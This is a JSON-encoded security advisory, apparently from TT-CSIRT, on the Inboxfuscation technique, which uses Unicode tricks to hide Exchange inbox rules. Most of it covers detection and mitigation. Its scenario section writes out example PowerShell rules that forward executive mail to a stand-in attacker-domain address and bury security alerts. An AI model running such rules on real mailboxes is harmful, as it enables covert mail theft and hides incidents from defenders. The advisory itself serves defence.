+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>U+200B</strong> (Zero Width Space): sec ret → sec[ZWSP]ret</li>\n\n\n\n<li><strong>U+200C</strong> (Zero Width Non-Joiner): Splits keywords invisibly</li>\n\n\n\n<li><strong>U+200D</strong> (Zero Width Joiner): Creates undetectable character combinations</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Bidirectional text manipulation",
+          "id": "bidirectional-text-manipulation"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Uses Right-to-Left (RTL) controls to manipulate character ordering:</p>",
+          "text": "Uses Right-to-Left (RTL) controls to manipulate character ordering:"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>U+202E</strong> (Right-to-Left Override): Reverses text rendering</li>\n\n\n\n<li><strong>U+2067</strong> (Right-to-Left Isolate): Creates visual confusion</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Functional obfuscation tricks",
+          "id": "functional-obfuscation-tricks"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Beyond Unicode manipulation, the framework includes several functional evasion techniques:</p>",
+          "text": "Beyond Unicode manipulation, the framework includes several functional evasion techniques:"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>Calendar Folder Forwarding</strong>: Moves emails to Calendar folder where users cannot view them</li>\n\n\n\n<li><strong>Null Character Injection</strong>: Breaks inbox rule services making rules unviewable</li>\n\n\n\n<li><strong>Whitespace Conditions</strong>: Creates rules that apply to all messages</li>\n\n\n\n<li><strong>Size Range Manipulation</strong>: Uses sub-1024 byte values that normalize to 0, matching all emails</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Attack scenarios",
+          "id": "attack-scenarios"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><strong>Scenario 1: Advanced Persistent Threat (APT) Campaign</strong></p>",
+          "text": "Scenario 1: Advanced Persistent Threat (APT) Campaign"
+        }
+      ]
+    },
+    {
+      "id": "objective",
+      "title": "Objective",
+      "level": 2,
+      "nodes": [
+        {
+          "type": "paragraph",
+          "html": "<p>: Long-term executive communication exfiltration</p>",
+          "text": ": Long-term executive communication exfiltration"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Powershell",
+          "id": "powershell"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>New-InboxRule -Name &#8220;Executive Communications Archive&#8221;</p>",
+          "text": "New-InboxRule -Name “Executive Communications Archive”"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>SubjectContainsWords &#8220;𝚋𝗈𝒂𝗋𝒹&#8221;,&#8221;𝖒𝖊𝖊𝗍𝗂𝗇𝗀&#8221;,&#8221;𝗆𝖾𝗋𝗀𝖾𝗋&#8221;</li>\n</ul>"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>MoveToFolder &#8220;:\\Calendar&#8221;</li>\n</ul>"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>ForwardTo &#8220;backup-system@attacker-domain.com&#8221;</li>\n</ul>"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>: Suppress security alerts and incident detection</p>",
+          "text": ": Suppress security alerts and incident detection"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Powershell",
+          "id": "powershell-2"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>New-InboxRule -Name &#8220;System Optimization&#8221;</p>",
+          "text": "New-InboxRule -Name “System Optimization”"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>SubjectContainsWords &#8220;ⓐ𝐥𝕖ⓡt&#8221;,&#8221;𝒾𝒏𝑐𝗂𝖉𝖊𝙣𝔱&#8221;,&#8221;𝐛ʳ𝖾𝔞𝖼𝔥&#8221;</li>\n</ul>"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>MoveToFolder &#8220;:\\Inbox &#8220;</li>\n</ul>"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\">\n  <li>StopProcessingRules $true</li>\n</ul>"
+        }
+      ]
+    },
+    {
+      "id": "evasion-characteristics",
+      "title": "Evasion characteristics",
+      "level": 2,
+      "nodes": [
+        {
+          "type": "paragraph",
+          "html": "<p>:</p>",
+          "text": ":"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Appears as legitimate archival rule to administrators</li>\n\n\n\n<li>Unicode keywords evade regex-based detection while functionally matching Latin equivalents</li>\n\n\n\n<li>Calendar folder movement effectively &#8220;deletes&#8221; emails from normal viewing</li>\n\n\n\n<li>External forwarding disguised as backup process</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Scenario 2: anti-forensics operation",
+          "id": "scenario-2-anti-forensics-operation"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>:</p>",
+          "text": ":"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Creates visually identical &#8220;:\\Inbox &#8221; folder with trailing whitespace</li>\n\n\n\n<li>Prioritizes rule above other inbox rules</li>\n\n\n\n<li>Unicode obfuscation evades keyword-based security monitoring</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Impact assessment",
+          "id": "impact-assessment"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Immediate threats",
+          "id": "immediate-threats"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>Complete evasion</strong> of traditional keyword-based detection systems</li>\n\n\n\n<li><strong>Persistent access</strong> to email communications even after credential resets</li>\n\n\n\n<li><strong>Silent data exfiltration</strong> through legitimate-appearing email forwarding</li>\n\n\n\n<li><strong>Anti-forensics capabilities</strong> that hide security alerts and incident indicators</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Long-term implications",
+          "id": "long-term-implications"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>Blind spots</strong> in current SIEM and email security platforms</li>\n\n\n\n<li><strong>Compliance failures</strong> as obfuscated rules may not appear in audit reports</li>\n\n\n\n<li><strong>Incident response challenges</strong> due to Unicode complexity in forensic analysis</li>\n\n\n\n<li><strong>Threat actor evolution</strong> as techniques become weaponized in active campaigns</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Detection strategies",
+          "id": "detection-strategies"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Current detection limitations",
+          "id": "current-detection-limitations"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Traditional security tools fail against Unicode obfuscation because they rely on:</p>",
+          "text": "Traditional security tools fail against Unicode obfuscation because they rely on:"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>ASCII-based pattern matching</li>\n\n\n\n<li>Simple keyword detection systems</li>\n\n\n\n<li>Visual similarity assumptions</li>\n\n\n\n<li>Limited Unicode character awareness</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Advanced detection framework",
+          "id": "advanced-detection-framework"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>The Inboxfuscation research provides a multi-layered detection methodology:</p>",
+          "text": "The Inboxfuscation research provides a multi-layered detection methodology:"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Character category analysis",
+          "id": "character-category-analysis"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Detect suspicious unicode categories",
+          "id": "detect-suspicious-unicode-categories"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>MATHEMATICAL_ALPHANUMERIC_SYMBOLS</li>\n\n\n\n<li>ZERO_WIDTH characters</li>\n\n\n\n<li>RTL_CHARS (bidirectional text controls)</li>\n\n\n\n<li>ENCLOSED_ALPHANUMERICS</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Multi-format log analysis",
+          "id": "multi-format-log-analysis"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Parse various exchange log formats",
+          "id": "parse-various-exchange-log-formats"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>JSON and CSV log files</li>\n\n\n\n<li>Exchange export formats</li>\n\n\n\n<li>Microsoft 365 Graph API logs</li>\n\n\n\n<li>Real-time rule execution events</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Risk scoring algorithm",
+          "id": "risk-scoring-algorithm"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Calculate risk scores based on",
+          "id": "calculate-risk-scores-based-on"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Unicode character counts</li>\n\n\n\n<li>External forwarding flags</li>\n\n\n\n<li>Obfuscated keyword identification</li>\n\n\n\n<li>Suspicious folder destinations</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Detection commands",
+          "id": "detection-commands"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Immediate rule audit",
+          "id": "immediate-rule-audit"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>:</p>",
+          "text": ":"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Powershell",
+          "id": "powershell-3"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Find-ObfuscatedInboxRules -Mailbox &#8220;user&#8221; -DebugOutput</p>",
+          "text": "Find-ObfuscatedInboxRules -Mailbox “user” -DebugOutput"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Historical analysis",
+          "id": "historical-analysis"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>:</p>",
+          "text": ":"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Powershell",
+          "id": "powershell-4"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Find-ObfuscatedInboxRules -InputFile &#8220;audit-logs.json&#8221; |</p>",
+          "text": "Find-ObfuscatedInboxRules -InputFile “audit-logs.json” |"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Where-Object {$_.RiskScore -gt 75} |</p>",
+          "text": "Where-Object {$_.RiskScore -gt 75} |"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Sort-Object RiskScore -Descending</p>",
+          "text": "Sort-Object RiskScore -Descending"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Mitigation strategies",
+          "id": "mitigation-strategies"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Immediate response actions",
+          "id": "immediate-response-actions"
+        },
+        {
+          "type": "list",
+          "html": "<ol class=\"govuk-list govuk-list--number\" start=\"1\" class=\"wp-block-list\">\n<li><strong>Comprehensive Rule Auditing</strong>\n<ul class=\"wp-block-list\">\n<li>Deploy Unicode-aware detection tools across all mailboxes</li>\n\n\n\n<li>Conduct historical analysis of existing inbox rules</li>\n\n\n\n<li>Implement automated scanning for Unicode obfuscation patterns</li>\n</ul>\n</li>\n\n\n\n<li><strong>Enhanced Monitoring</strong>\n<ul class=\"wp-block-list\">\n<li>Enable detailed Exchange audit logging</li>\n\n\n\n<li>Integrate Unicode detection capabilities into SIEM platforms</li>\n\n\n\n<li>Deploy real-time alerts for suspicious rule creation patterns</li>\n</ul>\n</li>\n\n\n\n<li><strong>Access Control Hardening</strong>\n<ul class=\"wp-block-list\">\n<li>Implement principle of least privilege for Exchange administration</li>\n\n\n\n<li>Enable multi-factor authentication for all Exchange access</li>\n\n\n\n<li>Monitor and restrict PowerShell execution in Exchange environments</li>\n</ul>\n</li>\n</ol>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Long-term defensive measures",
+          "id": "long-term-defensive-measures"
+        },
+        {
+          "type": "list",
+          "html": "<ol class=\"govuk-list govuk-list--number\" start=\"1\" class=\"wp-block-list\">\n<li><strong>Detection Pipeline Enhancement</strong>\n<ul class=\"wp-block-list\">\n<li>Integrate Unicode normalization in security tools</li>\n\n\n\n<li>Develop behavioral analysis capabilities for email rule creation</li>\n\n\n\n<li>Implement machine learning models for anomalous rule detection</li>\n</ul>\n</li>\n\n\n\n<li><strong>Security Awareness Training</strong>\n<ul class=\"wp-block-list\">\n<li>Educate administrators about Unicode obfuscation techniques</li>\n\n\n\n<li>Update incident response playbooks for Unicode-based attacks</li>\n\n\n\n<li>Conduct tabletop exercises simulating Inboxfuscation scenarios</li>\n</ul>\n</li>\n\n\n\n<li><strong>Proactive Red Team Testing</strong>\n<ul class=\"wp-block-list\">\n<li>Use Inboxfuscation framework for security assessments</li>\n\n\n\n<li>Test detection capabilities against Unicode-based evasion</li>\n\n\n\n<li>Validate incident response procedures for obfuscated attacks</li>\n</ul>\n</li>\n</ol>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Technical controls",
+          "id": "technical-controls"
+        },
+        {
+          "type": "list",
+          "html": "<ol class=\"govuk-list govuk-list--number\" start=\"1\" class=\"wp-block-list\">\n<li><strong>Exchange Configuration</strong>\n<ul class=\"wp-block-list\">\n<li>Implement inbox rule approval workflows for sensitive accounts</li>\n\n\n\n<li>Enable external forwarding restrictions and monitoring</li>\n\n\n\n<li>Deploy advanced threat protection for email security</li>\n</ul>\n</li>\n\n\n\n<li><strong>SIEM Integration</strong>\n<ul class=\"wp-block-list\">\n<li>Configure structured JSON output ingestion for Inboxfuscation detection</li>\n\n\n\n<li>Implement Unicode-aware correlation rules</li>\n\n\n\n<li>Enable automated response workflows for high-risk detections</li>\n</ul>\n</li>\n\n\n\n<li><strong>Network Monitoring</strong>\n<ul class=\"wp-block-list\">\n<li>Monitor Exchange Web Services API usage patterns</li>\n\n\n\n<li>Detect anomalous email forwarding behaviors</li>\n\n\n\n<li>Implement data loss prevention for sensitive email content</li>\n</ul>\n</li>\n</ol>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Forensic indicators",
+          "id": "forensic-indicators"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Unicode patterns to monitor",
+          "id": "unicode-patterns-to-monitor"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Mathematical alphanumeric symbol usage in rule names/conditions</li>\n\n\n\n<li>Zero-width character sequences in inbox rule definitions</li>\n\n\n\n<li>Bidirectional text control characters in email rules</li>\n\n\n\n<li>Enclosed alphanumeric variants in rule parameters</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Behavioral indicators",
+          "id": "behavioral-indicators"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Email rules forwarding to external addresses</li>\n\n\n\n<li>Rules moving emails to unusual folders (Calendar, custom folders with whitespace)</li>\n\n\n\n<li>High-privilege accounts creating multiple inbox rules rapidly</li>\n\n\n\n<li>Rules with conditions that apply to all messages (whitespace, null characters)</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Log artifacts",
+          "id": "log-artifacts"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Exchange audit logs showing New-InboxRule cmdlet execution with Unicode parameters</li>\n\n\n\n<li>Microsoft 365 Graph API requests containing obfuscated rule creation</li>\n\n\n\n<li>PowerShell execution logs with Unicode command parameters</li>\n\n\n\n<li>MAPI client activity creating hidden or obfuscated rules</li>\n</ul>"
+        }
+      ]
+    },
+    {
+      "id": "conclusion",
+      "title": "Conclusion",
+      "level": 2,
+      "nodes": [
+        {
+          "type": "paragraph",
+          "html": "<p>The Inboxfuscation framework represents a significant evolution in email-based attack techniques, demonstrating how Unicode obfuscation can completely bypass traditional security controls. While not yet observed in active campaigns, the technical feasibility and detection challenges suggest this represents a critical blind spot that security teams must address proactively.</p>",
+          "text": "The Inboxfuscation framework represents a significant evolution in email-based attack techniques, demonstrating how Unicode obfuscation can completely bypass traditional security controls. While not yet observed in active campaigns, the technical feasibility and detection challenges suggest this represents a critical blind spot that security teams must address proactively."
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Organizations should immediately deploy Unicode-aware detection capabilities, update their incident response procedures, and conduct proactive assessments using the open-source Inboxfuscation framework to identify and remediate potential vulnerabilities before threat actors weaponize these techniques in real-world attacks.</p>",
+          "text": "Organizations should immediately deploy Unicode-aware detection capabilities, update their incident response procedures, and conduct proactive assessments using the open-source Inboxfuscation framework to identify and remediate potential vulnerabilities before threat actors weaponize these techniques in real-world attacks."
+        }
+      ]
+    },
+    {
+      "id": "references",
+      "title": "References",
+      "level": 2,
+      "nodes": [
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/\">https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/</a></p>",
+          "text": "https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/\">https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/</a></p>",
+          "text": "https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken\">https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken</a></p>",
+          "text": "https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/\">https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/</a></p>",
+          "text": "https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/\">https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/</a></p>",
+          "text": "https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.cloudfall.cn/techniques/T1114/003/\">https://attack.cloudfall.cn/techniques/T1114/003/</a></p>",
+          "text": "https://attack.cloudfall.cn/techniques/T1114/003/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.mitre.org/techniques/T1114/003/\">https://attack.mitre.org/techniques/T1114/003/</a></p>",
+          "text": "https://attack.mitre.org/techniques/T1114/003/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://mitre.ptsecurity.com/en-US/T1114.003\">https://mitre.ptsecurity.com/en-US/T1114.003</a></p>",
+          "text": "https://mitre.ptsecurity.com/en-US/T1114.003"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.mitre.org/techniques/T1564/\">https://attack.mitre.org/techniques/T1564/</a></p>",
+          "text": "https://attack.mitre.org/techniques/T1564/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.cloudfall.cn/techniques/T1564/\">https://attack.cloudfall.cn/techniques/T1564/</a></p>",
+          "text": "https://attack.cloudfall.cn/techniques/T1564/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://www.picussecurity.com/resource/blog/t1562-impair-defenses\">https://www.picussecurity.com/resource/blog/t1562-impair-defenses</a></p>",
+          "text": "https://www.picussecurity.com/resource/blog/t1562-impair-defenses"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/\">https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/</a></p>",
+          "text": "https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.mitre.org/techniques/T1562/\">https://attack.mitre.org/techniques/T1562/</a></p>",
+          "text": "https://attack.mitre.org/techniques/T1562/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://attack.mitre.org/techniques/T1114/002/\">https://attack.mitre.org/techniques/T1114/002/</a></p>",
+          "text": "https://attack.mitre.org/techniques/T1114/002/"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><a href=\"https://cybersecuritynews.com/inboxfuscation-tool/\">https://cybersecuritynews.com/inboxfuscation-tool/</a></p>",
+          "text": "https://cybersecuritynews.com/inboxfuscation-tool/"
+        }
+      ]
+    }
+  ],
+  "navItems": [
+    {
+      "id": "advisory-overview",
+      "label": "Overview"
+    },
+    {
+      "id": "detailed-attack-analysis",
+      "label": "Detailed attack analysis",
+      "isSubItem": true
+    },
+    {
+      "id": "attack-prerequisites-and-access-requirements",
+      "label": "Attack prerequisites and access requirements",
+      "isSubItem": true
+    },
+    {
+      "id": "primary-access-requirements",
+      "label": "Primary access requirements",
+      "isSubItem": true
+    },
+    {
+      "id": "minimum-required-permissions",
+      "label": "Minimum required permissions",
+      "isSubItem": true
+    },
+    {
+      "id": "attack-vector",
+      "label": "Attack vector",
+      "isSubItem": true
+    },
+    {
+      "id": "primary-mitre-attck-mappings",
+      "label": "Primary mitre att&ck mappings",
+      "isSubItem": true
+    },
+    {
+      "id": "supporting-techniques",
+      "label": "Supporting techniques",
+      "isSubItem": true
+    },
+    {
+      "id": "technical-implementation",
+      "label": "Technical implementation",
+      "isSubItem": true
+    },
+    {
+      "id": "character-substitution",
+      "label": "Character substitution",
+      "isSubItem": true
+    },
+    {
+      "id": "zero-width-character-injection",
+      "label": "Zero-width character injection",
+      "isSubItem": true
+    },
+    {
+      "id": "bidirectional-text-manipulation",
+      "label": "Bidirectional text manipulation",
+      "isSubItem": true
+    },
+    {
+      "id": "functional-obfuscation-tricks",
+      "label": "Functional obfuscation tricks",
+      "isSubItem": true
+    },
+    {
+      "id": "attack-scenarios",
+      "label": "Attack scenarios",
+      "isSubItem": true
+    },
+    {
+      "id": "objective",
+      "label": "Objective"
+    },
+    {
+      "id": "powershell",
+      "label": "Powershell",
+      "isSubItem": true
+    },
+    {
+      "id": "powershell-2",
+      "label": "Powershell",
+      "isSubItem": true
+    },
+    {
+      "id": "evasion-characteristics",
+      "label": "Evasion characteristics"
+    },
+    {
+      "id": "scenario-2-anti-forensics-operation",
+      "label": "Scenario 2: anti-forensics operation",
+      "isSubItem": true
+    },
+    {
+      "id": "impact-assessment",
+      "label": "Impact assessment",
+      "isSubItem": true
+    },
+    {
+      "id": "immediate-threats",
+      "label": "Immediate threats",
+      "isSubItem": true
+    },
+    {
+      "id": "long-term-implications",
+      "label": "Long-term implications",
+      "isSubItem": true
+    },
+    {
+      "id": "detection-strategies",
+      "label": "Detection strategies",
+      "isSubItem": true
+    },
+    {
+      "id": "current-detection-limitations",
+      "label": "Current detection limitations",
+      "isSubItem": true
+    },
+    {
+      "id": "advanced-detection-framework",
+      "label": "Advanced detection framework",
+      "isSubItem": true
+    },
+    {
+      "id": "character-category-analysis",
+      "label": "Character category analysis",
+      "isSubItem": true
+    },
+    {
+      "id": "detect-suspicious-unicode-categories",
+      "label": "Detect suspicious unicode categories",
+      "isSubItem": true
+    },
+    {
+      "id": "multi-format-log-analysis",
+      "label": "Multi-format log analysis",
+      "isSubItem": true
+    },
+    {
+      "id": "parse-various-exchange-log-formats",
+      "label": "Parse various exchange log formats",
+      "isSubItem": true
+    },
+    {
+      "id": "risk-scoring-algorithm",
+      "label": "Risk scoring algorithm",
+      "isSubItem": true
+    },
+    {
+      "id": "calculate-risk-scores-based-on",
+      "label": "Calculate risk scores based on",
+      "isSubItem": true
+    },
+    {
+      "id": "detection-commands",
+      "label": "Detection commands",
+      "isSubItem": true
+    },
+    {
+      "id": "immediate-rule-audit",
+      "label": "Immediate rule audit",
+      "isSubItem": true
+    },
+    {
+      "id": "powershell-3",
+      "label": "Powershell",
+      "isSubItem": true
+    },
+    {
+      "id": "historical-analysis",
+      "label": "Historical analysis",
+      "isSubItem": true
+    },
+    {
+      "id": "powershell-4",
+      "label": "Powershell",
+      "isSubItem": true
+    },
+    {
+      "id": "mitigation-strategies",
+      "label": "Mitigation strategies",
+      "isSubItem": true
+    },
+    {
+      "id": "immediate-response-actions",
+      "label": "Immediate response actions",
+      "isSubItem": true
+    },
+    {
+      "id": "long-term-defensive-measures",
+      "label": "Long-term defensive measures",
+      "isSubItem": true
+    },
+    {
+      "id": "technical-controls",
+      "label": "Technical controls",
+      "isSubItem": true
+    },
+    {
+      "id": "forensic-indicators",
+      "label": "Forensic indicators",
+      "isSubItem": true
+    },
+    {
+      "id": "unicode-patterns-to-monitor",
+      "label": "Unicode patterns to monitor",
+      "isSubItem": true
+    },
+    {
+      "id": "behavioral-indicators",
+      "label": "Behavioral indicators",
+      "isSubItem": true
+    },
+    {
+      "id": "log-artifacts",
+      "label": "Log artifacts",
+      "isSubItem": true
+    },
+    {
+      "id": "conclusion",
+      "label": "Conclusion"
+    },
+    {
+      "id": "references",
+      "label": "References"
+    },
+    {
+      "id": "source-provenance",
+      "label": "Authoritative source"
+    },
+    {
+      "id": "emergency-reporting",
+      "label": "Emergency reporting"
+    },
+    {
+      "id": "related-resources",
+      "label": "Related resources"
+    }
+  ],
+  "externalReferences": [
+    "https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/",
+    "https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/",
+    "https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken",
+    "https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/",
+    "https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/",
+    "https://attack.cloudfall.cn/techniques/T1114/003/",
+    "https://attack.mitre.org/techniques/T1114/003/",
+    "https://mitre.ptsecurity.com/en-US/T1114.003",
+    "https://attack.mitre.org/techniques/T1564/",
+    "https://attack.cloudfall.cn/techniques/T1564/",
+    "https://www.picussecurity.com/resource/blog/t1562-impair-defenses",
+    "https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/",
+    "https://attack.mitre.org/techniques/T1562/",
+    "https://attack.mitre.org/techniques/T1114/002/",
+    "https://cybersecuritynews.com/inboxfuscation-tool/"
+  ],
+  "readingTimeMinutes": 7,
+  "isPublicDeliveryReady": true,
+  "provenance": {
+    "originatingAgency": "TT-CSIRT Vulnerability Coordination Team",
+    "sourceReferenceUrl": "https://ttcsirt.gov.tt/tt-csirt-452-23-09-25-security-alert-new-inboxfuscation-tool-that-bypasses-microsoft-exchange-inbox-rules-and-evades-detection/",
+    "upstreamDisclosedAt": "2025-09-23T15:10:41",
+    "importedAt": "2026-09-28T15:20:00Z"
+  }
+}
